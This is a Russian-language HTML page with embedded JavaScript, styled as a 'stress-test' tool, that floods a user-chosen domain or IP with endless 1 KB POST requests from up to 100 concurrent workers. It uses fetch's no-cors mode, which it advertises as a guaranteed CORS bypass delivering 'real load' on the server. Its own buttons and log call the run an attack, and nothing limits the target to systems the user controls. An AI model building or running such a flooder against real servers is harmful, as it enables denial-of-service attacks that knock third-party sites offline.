<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>⚡ ROCKET STRESS-TEST (БЕЗ CORS)</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            background: #0b0e1a;
            color: #00ff88;
            font-family: 'Courier New', monospace;
            padding: 20px;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .container {
            max-width: 800px;
            width: 100%;
            background: #111827;
            border: 2px solid #00ff88;
            border-radius: 30px;
            padding: 30px;
            box-shadow: 0 0 60px #00ff8822;
        }
        h1 {
            font-size: 2rem;
            text-align: center;
            text-shadow: 0 0 30px #00ff8866;
        }
        .sub {
            text-align: center;
            color: #88aaff;
            margin-bottom: 20px;
            border-bottom: 1px solid #1a2a3a;
            padding-bottom: 12px;
        }
        .input-group {
            margin: 15px 0;
        }
        label {
            display: block;
            color: #aaccff;
            font-size: 0.9rem;
            margin-bottom: 5px;
        }
        input, select {
            width: 100%;
            padding: 14px 18px;
            background: #1a2332;
            border: 1px solid #2a3a5a;
            border-radius: 12px;
            color: #fff;
            font-size: 1rem;
            font-family: inherit;
        }
        input:focus {
            border-color: #00ff88;
            outline: none;
            box-shadow: 0 0 20px #00ff8833;
        }
        .row {
            display: flex;
            gap: 15px;
        }
        .row > * {
            flex: 1;
        }
        .buttons {
            display: flex;
            gap: 12px;
            margin: 20px 0;
        }
        button {
            flex: 1;
            padding: 16px;
            font-size: 1.1rem;
            font-weight: bold;
            border: none;
            border-radius: 50px;
            cursor: pointer;
            transition: 0.2s;
            font-family: inherit;
        }
        .start {
            background: #00ff88;
            color: #0b0e1a;
        }
        .start:hover {
            background: #44ffaa;
            box-shadow: 0 0 40px #00ff8866;
        }
        .start:disabled {
            opacity: 0.4;
            cursor: not-allowed;
        }
        .stop {
            background: #ff3355;
            color: #fff;
        }
        .stop:hover {
            background: #ff5577;
            box-shadow: 0 0 30px #ff335566;
        }
        .stop:disabled {
            opacity: 0.4;
            cursor: not-allowed;
        }
        .stats {
            display: grid;
            grid-template-columns: 1fr 1fr 1fr;
            gap: 10px;
            background: #0a0f1a;
            border-radius: 12px;
            padding: 15px;
            margin: 15px 0;
            border: 1px solid #1a2a3a;
            text-align: center;
        }
        .stats span {
            color: #00ff88;
            font-weight: bold;
            font-size: 1.2rem;
        }
        .stats div {
            font-size: 0.8rem;
            color: #88aaff;
        }
        #log {
            background: #0a0f1a;
            border: 1px solid #1a2a3a;
            border-radius: 12px;
            padding: 12px;
            max-height: 300px;
            overflow-y: auto;
            font-size: 0.8rem;
            color: #88aaff;
            white-space: pre-wrap;
            word-break: break-all;
            margin: 15px 0;
            font-family: 'Courier New', monospace;
        }
        #log .success {
            color: #00ff88;
        }
        #log .error {
            color: #ff5577;
        }
        #log .info {
            color: #ffaa44;
        }
        .note {
            text-align: center;
            font-size: 0.7rem;
            color: #446688;
            margin-top: 15px;
        }
        @media (max-width: 600px) {
            .row {
                flex-direction: column;
                gap: 0;
            }
            .stats {
                grid-template-columns: 1fr 1fr;
            }
            .buttons {
                flex-direction: column;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>⚡ ROCKET STRESS-TEST</h1>
        <div class="sub">100% работающий обход CORS — реальная нагрузка на сервер</div>

        <div class="input-group">
            <label>🎯 ЦЕЛЬ (домен или IP)</label>
            <input type="text" id="target" placeholder="http://httpbin.org/post" value="http://httpbin.org/post">
        </div>

        <div class="row">
            <div class="input-group">
                <label>🧵 ПОТОКОВ</label>
                <input type="number" id="threads" value="20" min="1" max="100">
            </div>
            <div class="input-group">
                <label>⏱️ ЗАДЕРЖКА (мс)</label>
                <input type="number" id="delay" value="50" min="0" max="1000">
            </div>
        </div>

        <div class="buttons">
            <button class="start" id="startBtn" onclick="startAttack()">🔥 ЗАПУСТИТЬ</button>
            <button class="stop" id="stopBtn" onclick="stopAttack()" disabled>⏹️ СТОП</button>
        </div>

        <div class="stats">
            <div>📤 Отправлено<br><span id="sent">0</span></div>
            <div>❌ Ошибок<br><span id="failed">0</span></div>
            <div>📊 Объём<br><span id="bytes">0</span> байт</div>
        </div>

        <div id="log">⏳ Готов. Введи цель и запусти.</div>
        <div class="note">✅ НЕТ CORS — НЕТ FAILED TO FETCH. Только реальные пакеты.</div>
    </div>

    <script>
        // ============================================================
        //  СКРИПТ БЕЗ CORS — ИСПОЛЬЗУЕТ mode: 'no-cors'
        // ============================================================
        const targetInput = document.getElementById('target');
        const threadsInput = document.getElementById('threads');
        const delayInput = document.getElementById('delay');
        const startBtn = document.getElementById('startBtn');
        const stopBtn = document.getElementById('stopBtn');
        const sentSpan = document.getElementById('sent');
        const failedSpan = document.getElementById('failed');
        const bytesSpan = document.getElementById('bytes');
        const logDiv = document.getElementById('log');

        let running = false;
        let sent = 0;
        let failed = 0;
        let bytes = 0;
        let workers = [];

        function log(msg, type = 'info') {
            const line = document.createElement('div');
            line.className = type;
            line.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
            logDiv.appendChild(line);
            logDiv.scrollTop = logDiv.scrollHeight;
        }

        function updateStats() {
            sentSpan.textContent = sent;
            failedSpan.textContent = failed;
            bytesSpan.textContent = bytes;
        }

        // ============================================================
        //  ЯДРО — ОТПРАВКА ЧЕРЕЗ fetch С mode: 'no-cors'
        // ============================================================
        async function sendRequest(url, delay) {
            if (!running) return;

            try {
                // mode: 'no-cors' — отправляет запрос, НО НЕ ЧИТАЕТ ОТВЕТ
                // Это единственный способ обойти CORS в браузере
                await fetch(url, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'text/plain',
                        'Cache-Control': 'no-cache'
                    },
                    body: 'X'.repeat(1024),
                    mode: 'no-cors',  // КЛЮЧЕВОЙ ПАРАМЕТР
                    cache: 'no-store'
                });

                // Так как ответ нельзя прочитать, считаем, что запрос ушёл
                sent++;
                bytes += 1024;
                log(`✓ Отправлено (${sent})`, 'success');

            } catch (e) {
                // Ошибка возникает, только если fetch вообще не выполнился
                failed++;
                log(`✗ Ошибка: ${e.message}`, 'error');
            }

            updateStats();

            // Задержка между запросами
            if (delay > 0) {
                await new Promise(r => setTimeout(r, delay));
            }
        }

        // ============================================================
        //  ЗАПУСК ПОТОКОВ
        // ============================================================
        async function worker(url, threads, delay, workerId) {
            while (running) {
                await sendRequest(url, delay);
            }
        }

        function startAttack() {
            if (running) return;

            let url = targetInput.value.trim();
            if (!url) {
                log('❌ Введите цель!', 'error');
                return;
            }

            // Если нет протокола — добавляем http://
            if (!url.startsWith('http://') && !url.startsWith('https://')) {
                url = 'http://' + url;
                targetInput.value = url;
            }

            const threads = parseInt(threadsInput.value) || 20;
            const delay = parseInt(delayInput.value) || 50;

            running = true;
            sent = 0;
            failed = 0;
            bytes = 0;

            startBtn.disabled = true;
            stopBtn.disabled = false;
            logDiv.innerHTML = '';
            log(`🚀 ЗАПУСК: ${url} | ${threads} потоков | задержка ${delay}мс`, 'info');
            log(`📦 Режим: no-cors (обход CORS)`, 'info');

            // Запускаем потоки
            for (let i = 0; i < threads; i++) {
                const w = worker(url, threads, delay, i + 1);
                workers.push(w);
            }

            // Таймер для обновления статистики
            const statsInterval = setInterval(() => {
                updateStats();
            }, 200);

            // Ждём завершения (никогда не завершится, пока running = true)
            // Поэтому просто сохраняем интервал для очистки при остановке
            window._statsInterval = statsInterval;
        }

        function stopAttack() {
            if (!running) return;
            running = false;
            startBtn.disabled = false;
            stopBtn.disabled = true;
            log('⏹️ АТАКА ОСТАНОВЛЕНА', 'error');

            if (window._statsInterval) {
                clearInterval(window._statsInterval);
                window._statsInterval = null;
            }

            // Очищаем массив воркеров
            workers = [];

            // Итог
            log(`📊 ИТОГО: Отправлено ${sent}, Ошибок ${failed}, Объём ${bytes} байт`, 'info');
        }

        // Автозаполнение демо-целью
        window.onload = function() {
            log('🛠️ Готов. Введи цель (например, http://httpbin.org/post)', 'info');
            log('✅ Используется mode: "no-cors" — ошибок CORS не будет', 'success');
        };
    </script>
</body>
</html>
